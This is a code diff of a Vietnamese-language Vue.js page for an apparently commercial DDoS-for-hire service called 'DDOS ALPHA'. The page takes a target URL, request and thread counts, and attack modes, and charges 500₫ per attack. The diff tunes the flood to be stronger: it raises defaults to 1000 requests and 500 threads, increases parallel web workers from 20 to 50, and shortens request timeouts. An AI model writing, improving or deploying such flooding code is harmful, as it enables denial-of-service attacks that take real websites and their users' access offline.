@@ -634,7 +634,6 @@
             object-fit: cover;
             border: 2px solid #fff;
         }
-        /* Badge trạng thái - Nền trắng chữ đen */
         .badge-status {
             background: #ffffff !important;
             color: #000000 !important;
@@ -645,7 +644,6 @@
         .badge-status i {
             color: #000000;
         }
-        /* Input đen */
         .form-control-dark {
             background: #000000 !important;
             color: #ffffff !important;
@@ -798,7 +796,6 @@
 
         <!-- ===== DDoS ===== -->
         <div v-show="activeMenu === 'ddos'" class="card-content">
-            <!-- ẢNH DDOS ALPHA MỚI -->
             <img src="https://cdn.upanhlaylink.com/i/iWiGgofb.png" alt="DDOS ALPHA" class="ddos-banner" @click="activeMenu='lichsu'" title="Xem lịch sử DDoS" />
             
             <div class="ddos-title">
@@ -815,13 +812,13 @@
             </div>
             <div class="form-group">
                 <label>Số lần DDoS <small class="text-secondary" v-if="!isAdmin">(tối đa 1000)</small></label>
-                <input v-model.number="maxRequests" type="number" class="form-control form-control-dark" :max="isAdmin ? 999999 : 1000" placeholder="100" />
+                <input v-model.number="maxRequests" type="number" class="form-control form-control-dark" :max="isAdmin ? 999999 : 1000" placeholder="1000" />
                 <small class="text-primary" v-if="isAdmin">* Admin không giới hạn</small>
             </div>
             <div class="row g-2">
                 <div class="col-6">
                     <label>Luồng</label>
-                    <input v-model.number="threads" type="number" class="form-control form-control-dark" value="80" min="1" max="500" />
+                    <input v-model.number="threads" type="number" class="form-control form-control-dark" value="500" min="1" max="500" />
                 </div>
                 <div class="col-6">
                     <label>Method</label>
@@ -858,13 +855,11 @@
                 <i class="bi bi-play-circle"></i> {{ isRunning ? 'ĐANG XỬ LÝ...' : 'TẤN CÔNG (500₫)' }}
             </button>
 
-            <!-- ===== NÚT ZALO HỖ TRỢ 24/7 ===== -->
             <a href="https://zalo.me/0705511795" target="_blank" class="btn-zalo-support">
                 <img src="https://cdn.upanhlaylink.com/i/WJ8EzMxt.jpeg" alt="Zalo" />
                 Hỗ Trợ 24/7
             </a>
 
-            <!-- ===== BADGE TRẠNG THÁI - NỀN TRẮNG CHỮ ĐEN ===== -->
             <div class="d-flex justify-content-between mt-2">
                 <span class="badge badge-status">📊 {{ statusText }}</span>
                 <span class="badge badge-status">📤 {{ totalRequests }}</span>
@@ -1010,8 +1005,8 @@ new Vue({
         newPassword: '',
         activeMenu: 'ddos',
         targetUrl: '',
-        maxRequests: 100,
-        threads: 80,
+        maxRequests: 1000,
+        threads: 500,
         method: 'GET',
         attackMode: 'normal',
         custom404Paths: '',
@@ -1272,12 +1267,12 @@ new Vue({
 
             await new Promise(resolve => setTimeout(resolve, 30000));
 
-            // ===== BẮT ĐẦU DDoS VỚI 20 WORKER SONG SONG =====
-            this.statusText = 'ĐANG TẤN CÔNG (20 Workers)...';
+            // ===== BẮT ĐẦU DDoS VỚI 50 WORKER =====
+            this.statusText = 'ĐANG TẤN CÔNG (50 Workers)...';
             this.isRunning = true;
             this.ddosWorkers = [];
             
-            const numWorkers = 20;
+            const numWorkers = 50;
             const requestsPerWorker = Math.ceil(this.maxRequests / numWorkers);
             let totalSent = 0;
             let completedWorkers = 0;
@@ -1293,7 +1288,7 @@ new Vue({
                     worker.postMessage({
                         url: url,
                         method: this.method,
-                        threads: Math.min(200, Math.max(1, this.threads)),
+                        threads: Math.min(500, Math.max(1, this.threads)),
                         maxRequests: maxReq,
                         attackMode: this.attackMode,
                         custom404Paths: this.custom404Paths,
@@ -1402,7 +1397,7 @@ new Vue({
                         }
 
                         const controller = new AbortController();
-                        const timeout = setTimeout(() => controller.abort(), 1500);
+                        const timeout = setTimeout(() => controller.abort(), 500);
                         const opts = {
                             method, 
                             headers: { 
